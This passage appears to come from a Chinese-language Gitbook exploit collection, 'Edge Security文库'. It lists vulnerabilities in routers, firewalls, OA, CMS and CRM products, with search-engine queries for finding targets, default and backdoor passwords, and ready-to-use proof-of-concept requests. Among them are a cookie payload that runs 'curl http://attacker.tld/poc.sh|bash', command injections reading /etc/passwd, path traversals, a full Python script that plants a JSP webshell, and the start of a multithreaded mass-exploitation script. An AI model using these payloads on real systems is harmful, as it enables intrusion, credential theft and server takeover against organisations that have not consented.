PrOw!aN_fXp 该帐户可以同时在SSH和Web界面上使用。 $ ssh zyfwp@192.168.1.252 Password: Pr*******Xp Router> show users current No: 1 Name: zyfwp Type: admin (...) Router> ref: https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html https://twitter.com/dozernz/status/1344435468868358145 https://forum.ywhack.com/thread-114904-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/zzzcms 远程代码执行漏洞（CVE-2021-32605）.html":{"url":"Edge_Security/zzzcms 远程代码执行漏洞（CVE-2021-32605）.html","title":"zzzcms 远程代码执行漏洞（CVE-2021-32605）","keywords":"","body":"zzzcms 远程代码执行漏洞（CVE-2021-32605） 此漏洞使远程攻击者可以在受影响的zzzphp安装上执行任意代码。利用此漏洞不需要身份验证。特定缺陷存在于搜索模板的处理中。此问题是由于在处理搜索模板时缺乏对用户提供键的正确验证而导致的。攻击者可以利用此漏洞在Web服务器的上下文中执行代码。 影响版本： zzzphp FOFA： app=\"ZZZCMS\" poc： GET /?location=search HTTP/1.1 Host: target.tld Cookie: keys={if:=`curl http://attacker.tld/poc.sh|bash`}{end if} curl -b 'keys={if:=`curl http://attacker.tld/poc.sh|bash`}{end if}' 'http://target.tld/?location=search' ref: http://www.zzzcms.com/a/news/31_282_1.html https://srcincite.io/advisories/src-2021-0015/ https://nvd.nist.gov/vuln/detail/CVE-2021-32605 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/三星路由器WLAN AP WEA453e 未授权RCE等多个漏洞.html":{"url":"Edge_Security/三星路由器WLAN AP WEA453e 未授权RCE等多个漏洞.html","title":"三星路由器WLAN AP WEA453e 未授权RCE等多个漏洞","keywords":"","body":"三星路由器WLAN AP WEA453e 未授权RCE等多个漏洞 这玩意儿国内基本上碰不到..不知道为啥要写个工具那啥再那啥.... FOFA： title==\"Samsung WLAN AP\" Shdan： title:\"Samsung WLAN AP\" 路由器默认密码为： root sweap12~ rce： POST： POST /(download)/tmp/a.txt HTTP/1.1 Host: forum.ywhack.com User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 41 command1=shell:ifconfig| dd of=/tmp/a.txt Get： /(download)/tmp/a.txt?command1=shell:ifconfig| dd of=/tmp/a.txt ref： https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/ https://forum.ywhack.com/thread-114838-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/中新金盾信息安全管理系统 默认密码漏洞.html":{"url":"Edge_Security/中新金盾信息安全管理系统 默认密码漏洞.html","title":"中新金盾信息安全管理系统 默认密码漏洞","keywords":"","body":"中新金盾信息安全管理系统 默认密码漏洞 FOFA： title=\"中新金盾信息安全管理系统\" PoC： username：admin password：zxsoft1234!@#$ 指纹： { \"cms\": \"中新金盾信息安全管理系统\", \"method\": \"keyword\", \"location\": \"body\", \"keyword\": [\"中新金盾信息安全管理系统\",\"login\",\"useusbkey\"] } Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/云尚在线客服系统任意文件上传.html":{"url":"Edge_Security/云尚在线客服系统任意文件上传.html","title":"云尚在线客服系统任意文件上传","keywords":"","body":"云尚在线客服系统任意文件上传 FOFA: body=\"cgwl.ico\" 访问: /index/index/home?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=0&special=1 //默认ID为1 接入客服 点击图片上传抓包 参数修改 Content-Disposition: form-data; name=\"upload\" 修改为 Content-Disposition: form-data; name=\"editormd-image-file\" POST请求 /admin/event/upload 改为 /admin/event/uploadimg POST /admin/event/uploadimg HTTP/1.1 Host: target ... Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"1.jpg.php\" Content-Type: image/png via:RoSyNice Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/会捷通云视讯 敏感信息泄漏.html":{"url":"Edge_Security/会捷通云视讯 敏感信息泄漏.html","title":"会捷通云视讯 敏感信息泄漏","keywords":"","body":"会捷通云视讯 敏感信息泄漏 会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息。 poc： http://target/him/api/rest/V1.0/system/log/list?filePath=../ ref： http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E5%88%9B%E8%A7%86%E8%BF%85/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF%20list%20%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/佑友防火墙 后台RCE-默认口令.html":{"url":"Edge_Security/佑友防火墙 后台RCE-默认口令.html","title":"佑友防火墙 后台RCE-默认口令","keywords":"","body":"佑友防火墙 后台RCE/默认口令 佑友防火墙后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令。 默认密码：admin/hicomadmin RCE： 系统管理 >> 维护工具 >> Ping PoC： 127.0.0.1|whoami via:peiqi Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/华硕-GT-AC2900-身份验证绕过（CVE-2021-32030）.html":{"url":"Edge_Security/华硕-GT-AC2900-身份验证绕过（CVE-2021-32030）.html","title":"华硕-GT-AC2900-身份验证绕过（CVE-2021-32030）","keywords":"","body":"华硕-GT-AC2900-身份验证绕过（CVE-2021-32030） ASUS GT-AC2900管理员应用程序在处理未经身份验证的用户的远程输入时，容易受到身份验证绕过漏洞的攻击，从而导致对管理员界面的未经授权的访问。 受影响版本： ASUS GT-AC2900韧体版本9.0.0.4.386.41994（测试版） ASUS GT-AC2900韧体版本3.0.0.4.386.41793（最新生产） 详情分析可以见：https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md 通过在auth_check添加空字符进行绕过身份验证。 poc： GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1 Host: 192.168.1.107:8443 Content-Length: 0 User-Agent: asusrouter-- Connection: close Referer: https://192.168.1.107:8443/ Cookie: asus_token=\\0Invalid; clickedItem_tab=0 HTTP/1.0 200 OK Server: httpd/2.0 Content-Type: application/json;charset=UTF-8 Connection: close { \"get_cfg_clientlist\":[{\"alias\":\"24:4B:FE:64:37:10\",\"model_name\":\"GT-AC2900\",\"ui_model_name\":\"GT-AC2900\",\"fwver\":\"3.0.0.4.386_41793-gdb31cdc\",\"newfwver\":\"\",\"ip\":\"192.168.50.1\",\"mac\":\"24:4B:FE:64:37:10\",\"online\":\"1\",\"ap2g\":\"24:4B:FE:64:37:10\",\"ap5g\":\"24:4B:FE:64:37:14\",\"ap5g1\":\"\",\"apdwb\":\"\",\"wired_mac\":[ ... ... } Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/和信创天云桌面系统命令执行，文件上传 全版本 RCE.html":{"url":"Edge_Security/和信创天云桌面系统命令执行，文件上传 全版本 RCE.html","title":"和信创天云桌面系统命令执行，文件上传 全版本 RCE","keywords":"","body":"和信创天云桌面系统命令执行，文件上传 全版本 RCE poc： POST /Upload/upload_file.php?l=1 HTTP/1.1 Host: x.x.x.x User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 Referer: x.x.x.x Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8 Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv Content-Length: 164 ------WebKitFormBoundaryfcKRltGv Content-Disposition: form-data; name=\"file\"; filename=\"1.png\" Content-Type: image/avif 1 ------WebKitFormBoundaryfcKRltGv-- 参考：https://forum.butian.net/share/80 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/天清汉马USG防火墙 逻辑缺陷漏洞 CNVD-2021-12793.html":{"url":"Edge_Security/天清汉马USG防火墙 逻辑缺陷漏洞 CNVD-2021-12793.html","title":"天清汉马USG防火墙 逻辑缺陷漏洞 CNVD-2021-12793","keywords":"","body":"天清汉马USG防火墙 逻辑缺陷漏洞 CNVD-2021-12793 启明星辰 天清汉马USG防火墙 存在逻辑缺陷漏洞，攻击者通过账号密码可以进入后台后更改任意用户权限升级为管理员。 默认账号密码可以在这里找到：https://forum.ywhack.com/bountytips.php?password 账号：useradmin 密码：venus.user 登录后点击管理员右侧的编辑按钮进行更改用户权限........ 凸.... Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/奇安信NS-NGFW 网康下一代防火墙 前台RCE.html":{"url":"Edge_Security/奇安信NS-NGFW 网康下一代防火墙 前台RCE.html","title":"奇安信NS-NGFW 网康下一代防火墙 前台RCE","keywords":"","body":"奇安信NS-NGFW 网康下一代防火墙 前台RCE 情报见：https://forum.ywhack.com/thread-115437-1-1.html poc： POST /directdata/direct/router HTTP/1.1 Host: Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: PHPSESSID=jdlgkktr6uf0uar3u60b3ouig2; ys-active_page=s%3A Content-Length: 204 { \"action\": \"SSLVPN_Resource\", \"method\": \"deleteImage\", \"data\": [{ \"data\": [\"/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test.txt\"] }], \"type\": \"rpc\", \"tid\": 17 } https://forum.ywhack.com/thread-115443-1-6.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/奇安信天擎 越权访问.html":{"url":"Edge_Security/奇安信天擎 越权访问.html","title":"奇安信天擎 越权访问","keywords":"","body":"奇安信天擎 越权访问 fofa：title=\"360新天擎\" poc： GET /api/dbstat/gettablessize HTTP/1.1 HOST: target .... Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/孚盟云 CRM系统多个高危漏洞.html":{"url":"Edge_Security/孚盟云 CRM系统多个高危漏洞.html","title":"孚盟云 CRM系统多个高危漏洞","keywords":"","body":"孚盟云 CRM系统多个高危漏洞 FOFA: icon_hash=\"1533124028\" 详情可以看：https://xz.aliyun.com/t/9438 1.任意文件删除 2.任意文件下载 3.多个SQL注入 4.任意用户密码重置 ... 测试了几个不存在 应该不是通杀... Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/安天高级可持续威胁安全检测系统 越权访问漏洞.html":{"url":"Edge_Security/安天高级可持续威胁安全检测系统 越权访问漏洞.html","title":"安天高级可持续威胁安全检测系统 越权访问漏洞","keywords":"","body":"安天高级可持续威胁安全检测系统 越权访问漏洞 安天高级可持续威胁安全检测系统存在越权访问漏洞，攻击者可以通过工具修改特定的返回包导致越权后台查看敏感信息。 通过抓包修改login_status的参数为true达到越权。 poc： GET /api/user/islogin HTTP/1.1 Host：target Response： HTTP/1.1 200 OK Server: nginx/1.14.2 Date: Sun, 18 Apr 2021 10:43:46 GMT Content-Type: application/json Content-Length: 51 Connection: close {\"role\": \"\", \"login_status\": false, \"result\": \"ok\"} ref： https://mp.weixin.qq.com/s/Bmn4w_OGMnC4PFKJX85p8A Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/宏电 H8922 路由器中多个漏洞（CVE-2021-28149~52）.html":{"url":"Edge_Security/宏电 H8922 路由器中多个漏洞（CVE-2021-28149~52）.html","title":"宏电 H8922 路由器中多个漏洞（CVE-2021-28149~52）","keywords":"","body":"宏电 H8922 路由器中多个漏洞（CVE-2021-28149~52） 宏电 H8922设备中的几个漏洞可以让远程攻击者使用root权限让设备执行任意命令，导致的原因是因为用户提供的数据没有得到过滤，并且存在后门帐户允许通过端口5188/tcp进行访问。 CVE编号：CVE-2021-28149，CVE-2021-28150，CVE-2021-28151，CVE-2021-28152 影响版本： 宏电 8922 3.0.5 1.隐藏后门 可以使用隐藏的用户默认账号密码进行连接5188端口以获得root权限。 root:superzxmn 2.命令注入 System - Network Test（/tools.cgi）模块下可以使用最小特权（来宾）用户通过替换命令结束字符以超级用户（root）的身份执行系统任意命令。 3.路径遍历 日志导出功能(/log_download.cgi)由于未验证用户输入，导致路径遍历漏洞，可以以最小的权限用户从设备下载任意文件。 PoC： http://[ip]/log_download.cgi?type=../../etc/passwd ref： https://ssd-disclosure.com/ssd-advisory-hongdian-h8922-multiple-vulnerabilities/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/帆软 V9未授权RCE漏洞.html":{"url":"Edge_Security/帆软 V9未授权RCE漏洞.html","title":"帆软 V9未授权RCE漏洞","keywords":"","body":"帆软 V9未授权RCE漏洞 FineReport V9 注意: 这个漏洞是任意文件覆盖，上传 JSP 马，需要找已存在的 jsp 文件进行覆盖 Tomcat 启动帆软后默认存在的 JSP 文件: 比如:/tomcat-7.0.96/webapps/ROOT/index.jsp 覆盖 Tomcat 自带 ROOT 目录下的 index.jsp: POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"\",\"__CHARSET__\":\"UTF-8\"} https://forum.ywhack.com/thread-115389-1-6.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.html":{"url":"Edge_Security/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.html","title":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757","keywords":"","body":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757 FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。FineReport 8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。 FOFA: app=\"帆软-FineReport\" 影响版本： FineReport 读密码文件 privilege.xml PoC: hxxp://target//WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml //路径分为两种 /WebReport/ReportServer ReportServer 解密： # 使用python写出的解密代码为 cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码 Password = \"\" cipher = cipher[3:] #截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) ref: https://mp.weixin.qq.com/s/ae8A8PGJCtr6uS11dRpzcw https://www.cnvd.org.cn/flaw/show/CNVD-2018-04757 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/微信客户端远程命令执行漏洞.html":{"url":"Edge_Security/微信客户端远程命令执行漏洞.html","title":"微信客户端远程命令执行漏洞","keywords":"","body":"微信客户端远程命令执行漏洞 微信客户端存在远程命令执行漏洞。目前已经发现在野利用，受害者点击链接就会中招，微信Windows PC版进程webchatweb.exe会加载shellcode执行，整个过程无文件落地，无新进程产生，攻击者可以直接获取目标机器权限。 影响版本： 微信Windows版 安恒信息应急响应中心分析的攻击链： 1、 攻击者利用微信（PC版）0day构造恶意的钓鱼链接，通过微信将钓鱼链接发送给目标员工。 2、 当员工打开攻击者的钓鱼链接时触发该漏洞，从而导致目标员工PC被植入攻击者制作的cobalstrike木马，木马进程为：xxxsoft.exe，同时创建了名为dotnet_v4.3的系统服务。 3、 随后，攻击者进一步在c:\\ProgramData\\目录下放置TxPortMap.exe 扫描工具并利用该工具扫描目标单位内网。 参考：https://mp.weixin.qq.com/s/OfPNr-l_9kzl1MdE7DSHHQ bugfor的这篇文章也挺详细的：https://www.bugfor.com/vuls/vulnerability/6962.html exploit.js： ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [#shellcode];//shellcode替换成自己的 注意是x86的 function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i ref： https://mp.weixin.qq.com/s/TC9EDiiZnxGeyM7BP9wZYQ https://forum.ywhack.com/thread-115490-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/智慧校园管理系统 前台任意文件上传.html":{"url":"Edge_Security/智慧校园管理系统 前台任意文件上传.html","title":"智慧校园管理系统 前台任意文件上传","keywords":"","body":"智慧校园管理系统 前台任意文件上传 智慧校园管理系统前台注册页面存在文件上传，由于没有对上传的文件进行审查导致可上传恶意文件控制服务器. FOFA: body=\"DC_Login/QYSignUp\" 在用户注册页面(无注册按钮可直接访问接口)上，上传功能导致可以上传恶意文件，直接getshell. 路径： /DC_Login/QYSignUp /DC_OA_WJG/Upload ref： https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484103&idx=1&sn=b23f257cb763f972e8803f3fd7712632 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/泛微 OA 前台 GetShell 复现.html":{"url":"Edge_Security/泛微 OA 前台 GetShell 复现.html","title":"泛微 OA 前台 GetShell 复现","keywords":"","body":"泛微 OA 前台 GetShell 复现 漏洞路径： /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp 直接访问如状态码为200则大部分都存在。 构造zip压缩包上传进行getshell。 PoC.py: import zipfile import random import sys import requests def generate_random_str(randomlength=16): random_str = '' base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789' length = len(base_str) - 1 for i in range(randomlength): random_str += base_str[random.randint(0, length)] return random_str mm = generate_random_str(8) webshell_name1 = mm+'.jsp' webshell_name2 = '../../../'+webshell_name1 def file_zip(): shell = \"\"\" \"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %> \"\"\" ## 替换shell内容 zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED) zf.writestr(webshell_name2, shell) def GetShell(urllist): file_zip() print('上传文件中') urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp' file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))] requests.post(url=urls,files=file,timeout=60, verify=False) GetShellurl = urllist+'/cloudstore/'+webshell_name1 GetShelllist = requests.get(url = GetShellurl) if GetShelllist.status_code == 200: print('利用成功webshell地址为:'+GetShellurl) else: print('未找到webshell利用失败') def main(): if (len(sys.argv) == 2): url = sys.argv[1] GetShell(url) else: print(\"python3 lgo.py http://xx.xx.xx.xx\") if __name__ == '__main__': main() ref： https://www.cnblogs.com/nul1/p/14749353.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/泛微e-cology任意文件上传.html":{"url":"Edge_Security/泛微e-cology任意文件上传.html","title":"泛微e-cology任意文件上传","keywords":"","body":"泛微e-cology任意文件上传 POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: multipart/form-data; boundary=--------1638451160 Content-Length: 171 ----------1638451160 Content-Disposition: form-data; name=\"test\"; filename=\"test.jsp\" Content-Type: image/jpeg helloword ----------1638451160-- https://mp.weixin.qq.com/s?__biz=MzkxMzIzNTU5Mg==&mid=2247483666&idx=1&sn=e70efe98c064e0f1df986e2b65c1a608&chksm=c1018af5f67603e39ce4d6e9375875e63e7b80633a1f99959f8d4652193ac3734765a99099ea&mpshare=1&scene=23&srcid=0414cqXy50udQOy19LYOMega&sharer_sharetime=1618332600979&sharer_shareid=d15208c7b27f111e2fe465f389ab6fac#rd Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/泛微OA E-cology WorkflowServiceXml 远程代码执行漏洞.html":{"url":"Edge_Security/泛微OA E-cology WorkflowServiceXml 远程代码执行漏洞.html","title":"泛微OA E-cology WorkflowServiceXml 远程代码执行漏洞","keywords":"","body":"泛微OA E-cology WorkflowServiceXml 远程代码执行漏洞 泛微OA E-Cology以移动互联下的组织社交化转型需求为导向，采用轻前端重后端的设计思路，在前端面向用户提供个性化的办公平台，后端引擎帮助企业高效整合既有的IT资源生成符合用户需求的IT应用，帮助企业实现多种路径实现移动协同办公。WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行。 影响版本： E-cology FOFA：app=\"泛微-协同办公OA\" 详情可以参考：https://www.anquanke.com/post/id/239865 Payload： //\b内容实体编码。 POST /services%20/WorkflowServiceXml HTTP/1.1 Host: http://nv0of7.dnslog.cn http://nv0of7.dnslog.cn 2 ref： https://nox.qianxin.com/vulnerability/detail/98398 https://www.anquanke.com/post/id/239865 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/海康威视 流媒体管理服务器任意文件读取-通用弱口令 CNVD-2021-14544.html":{"url":"Edge_Security/海康威视 流媒体管理服务器任意文件读取-通用弱口令 CNVD-2021-14544.html","title":"海康威视 流媒体管理服务器任意文件读取-通用弱口令 CNVD-2021-14544","keywords":"","body":"海康威视 流媒体管理服务器任意文件读取/通用弱口令 CNVD-2021-14544 杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。 FOFA: title=\"流媒体管理服务器\" 默认口令：admin/12345 PoC: GET /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: ref: https://forum.ywhack.com/thread-115314-1-8.html https://www.cnvd.org.cn/flaw/show/CNVD-2021-14544 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/狮子鱼社区团购系统 wxapp.php 文件上传漏洞.html":{"url":"Edge_Security/狮子鱼社区团购系统 wxapp.php 文件上传漏洞.html","title":"狮子鱼社区团购系统 wxapp.php 文件上传漏洞","keywords":"","body":"狮子鱼社区团购系统 wxapp.php 文件上传漏洞 狮子鱼社区团购系统CMS wxapp.php文件上传漏洞，可上传任意文件，导致getshell. 后台默认密码为：admin/admin888 源码下载地址：http://cr3.9pj8m.com/shiziyushequtuangouyuanma.zip 修改数据库配置文件： Modules/Common/Conf/db.php Modules/Seller/Conf/db.php poc： POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1 Host: \u0001 Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs ... ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"upfile\"; filename=\"123123.php\" Content-Type: image/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs-- 参考： https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4017 https://forum.ywhack.com/thread-115578-1-2.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/用友 NCCloud FS文件管理SQL注入.html":{"url":"Edge_Security/用友 NCCloud FS文件管理SQL注入.html","title":"用友 NCCloud FS文件管理SQL注入","keywords":"","body":"用友 NCCloud FS文件管理SQL注入 用友 NCCloud FS文件管理登录页面对用户名参数没有过滤，存在SQL注入. poc: GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1 Host: ... //登录处username参数 from:https://mp.weixin.qq.com/s/jb7XeLGvdyNrF1xQFsXDjA Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/用友 U8 OA test.jsp SQL注入漏洞.html":{"url":"Edge_Security/用友 U8 OA test.jsp SQL注入漏洞.html","title":"用友 U8 OA test.jsp SQL注入漏洞","keywords":"","body":"用友 U8 OA test.jsp SQL注入漏洞 用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞。 poc: http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1)) via:PeiQi Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/用友NC 6.5 反序列化命令执行.html":{"url":"Edge_Security/用友NC 6.5 反序列化命令执行.html","title":"用友NC 6.5 反序列化命令执行","keywords":"","body":"用友NC 6.5 反序列化命令执行 详情可以看某C 1day 反序列化漏洞的武器级利用：https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/用友nc 6.5 文件上传 PoC.html":{"url":"Edge_Security/用友nc 6.5 文件上传 PoC.html","title":"用友nc 6.5 文件上传 PoC","keywords":"","body":"用友nc 6.5 文件上传 PoC fofa: app=\"用友-UFIDA-NC\" exp.py: import requests import threadpool import urllib3 import sys import argparse urllib3.disable_warnings() proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'} header = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://google.com\", } def multithreading(funcname, filename=\"url.txt\", pools=5): works = [] with open(filename, \"r\") as f: for i in f: func_params = [i.rstrip(\"\\n\")] works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(funcname, works) [pool.putRequest(req) for req in reqs] pool.wait() def wirte_targets(vurl, filename): with open(filename, \"a+\") as f: f.write(vurl + \"\\n\") return vurl def exp(u): uploadHeader = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Content-Type\": \"multipart/form-data;\", \"Referer\": \"https://google.com\" } uploadData = 